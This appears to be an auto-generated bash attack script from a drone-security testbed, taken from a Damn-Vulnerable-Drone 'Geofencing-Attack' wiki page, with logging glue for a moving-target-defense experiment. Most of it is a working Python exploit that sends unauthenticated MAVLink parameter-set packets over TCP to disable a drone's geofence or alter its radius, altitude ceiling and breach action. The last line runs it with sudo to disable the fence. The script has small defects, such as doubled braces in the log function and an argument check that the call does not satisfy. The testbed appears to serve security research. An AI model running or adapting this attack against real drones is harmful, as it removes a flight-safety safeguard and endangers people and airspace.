#!/usr/bin/env bash
# Auto-generated from: /home/kali/MTD_full_testbed/Damn-Vulnerable-Drone.wiki/Geofencing-Attack.md
# Created: 2025-09-14 13:46:03
# NOTE: 설명/서사는 제거되었고, 코드블록/프롬프트 명령만 포함됩니다.

# MTD_INTERFACE_START
# ==========================================================
# MTD-aware Target Acquisition & Logging Setup
# ==========================================================
SCRIPT_DIR=$( cd -- "$( dirname -- "${BASH_SOURCE[0]}" )" &> /dev/null && pwd )
PROJECT_ROOT=$(realpath "$SCRIPT_DIR/../../../../")

# MTD 타겟 조회
pushd "$PROJECT_ROOT" > /dev/null
TARGET_ADDR=$(python3 -m dvd_lite.dvd_attacks_lpc.interface)
POP_RESULT=$?
popd > /dev/null

if [ $POP_RESULT -ne 0 ] || [ -z "$TARGET_ADDR" ]; then
    echo "ERROR: Could not get active target from MTD interface. Aborting attack."
    exit 1
fi

TARGET_IP=$(echo $TARGET_ADDR | cut -d: -f1)
TARGET_PORT=$(echo $TARGET_ADDR | cut -d: -f2)

# 중앙 로거 함수 정의 (정확한 타임스탬프를 위해 쉘의 log 함수와 통합)
log() {{
    # 쉘 표준 로그 출력
    printf '[%(%F_%T)T] %s\n' -1 "$*"

    # bus.log에 JSON 이벤트 로깅
    EVENT_TYPE=$1
    shift
    EVENT_DATA_STR="$*"
    pushd "$PROJECT_ROOT" > /dev/null
    python3 -c "from dvd_lite.dvd_attacks_lpc.bus.logger import log_bus_event; log_bus_event('$EVENT_TYPE', {{'message': '$EVENT_DATA_STR'}})"
    popd > /dev/null
}}
# MTD_INTERFACE_END
set -euo pipefail

# 기준 경로 (요구사항)
export BASE="${BASE:-$PWD}"

# 공통 로그 연결(선택사항) - 존재 시 로드
if [[ -f "$BASE/00_env.sh" ]]; then . "$BASE/00_env.sh"; else
  DVD_LOG="${DVD_LOG:-$BASE/attack_output/dvd.log}"; mkdir -p "$(dirname "$DVD_LOG")"
fi

log "[ATTACK] id=geofencing-attack src=Geofencing-Attack.md"
log "[BLOCK 1] type=python"
python3 - "${TARGET_IP}:${TARGET_PORT}" <<PY
# --- argv glue for converter ---
import os, sys, re
if len(sys.argv) <= 1:
    ep = os.environ.get('TARGET_EP') or os.environ.get('MAV_EP', 'udp:127.0.0.1:14550')
    if ep.startswith('udp:'):
        try:
            _, rest = ep.split(':', 1)
            ep = rest
        except ValueError:
            pass
    # expect ip:port
    if re.match(r'^\d{1,3}(\.\d{1,3}){3}:\d+$', ep):
        sys.argv = [sys.argv[0], ep]
from pymavlink import mavutil
from scapy.all import *
import sys
import socket

def set_param(mav, param_id, param_value, param_type):
    return mav.param_set_encode(
        target_system=mav.target_system,
        target_component=mav.target_component,
        param_id=param_id.encode('utf-8'),
        param_value=param_value,
        param_type=param_type
    ).pack(mav)

def send_mavlink_packet_tcp(packet_data, target_ip, target_port):
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.connect((target_ip, target_port))
    sock.send(packet_data)
    sock.close()

if __name__ == "__main__":
    if len(sys.argv) != 3:
        print("Usage: python geo-fencing.py <ip:port> <action>")
        print("Actions: disable, enable, set_radius:<value>, set_alt_max:<value>, set_action:<value>")
        sys.exit(1)

    target = sys.argv[1]
    action = sys.argv[2]
    target_ip, target_port = target.split(':')
    target_port = int(target_port)

    mav = mavutil.mavlink.MAVLink(None)
    mav.target_system = 1
    mav.target_component = 1

    if action == "disable":
        packet = set_param(mav, 'FENCE_ENABLE', 0, mavutil.mavlink.MAV_PARAM_TYPE_UINT8)
        send_mavlink_packet_tcp(packet, target_ip, target_port)
        print("Geofence disabled")
    elif action == "enable":
        packet = set_param(mav, 'FENCE_ENABLE', 1, mavutil.mavlink.MAV_PARAM_TYPE_UINT8)
        send_mavlink_packet_tcp(packet, target_ip, target_port)
        print("Geofence enabled")
    elif action.startswith("set_radius:"):
        value = float(action.split(":")[1])
        packet = set_param(mav, 'FENCE_ENABLE', 1, mavutil.mavlink.MAV_PARAM_TYPE_UINT8)
        send_mavlink_packet_tcp(packet, target_ip, target_port)
        packet = set_param(mav, 'FENCE_RADIUS', value, mavutil.mavlink.MAV_PARAM_TYPE_REAL32)
        send_mavlink_packet_tcp(packet, target_ip, target_port)
        print(f"Geofence radius set to {value} meters")
    elif action.startswith("set_alt_max:"):
        value = float(action.split(":")[1])
        packet = set_param(mav, 'FENCE_ENABLE', 1, mavutil.mavlink.MAV_PARAM_TYPE_UINT8)
        send_mavlink_packet_tcp(packet, target_ip, target_port)
        packet = set_param(mav, 'FENCE_ALT_MAX', value, mavutil.mavlink.MAV_PARAM_TYPE_REAL32)
        send_mavlink_packet_tcp(packet, target_ip, target_port)
        print(f"Geofence maximum altitude set to {value} meters")
    elif action.startswith("set_action:"):
        value = int(action.split(":")[1])
        packet = set_param(mav, 'FENCE_ENABLE', 1, mavutil.mavlink.MAV_PARAM_TYPE_UINT8)
        send_mavlink_packet_tcp(packet, target_ip, target_port)
        packet = set_param(mav, 'FENCE_ACTION', value, mavutil.mavlink.MAV_PARAM_TYPE_UINT8)
        send_mavlink_packet_tcp(packet, target_ip, target_port)
        print(f"Geofence breach action set to {value}")
    else:
        print("Invalid action. Actions: disable, enable, set_radius:<value>, set_alt_max:<value>, set_action:<value>")
        sys.exit(1)
PY

log "[BLOCK 2] type=shell"
sudo python3 geo-fencing.py ${TARGET_IP}:5760 disable

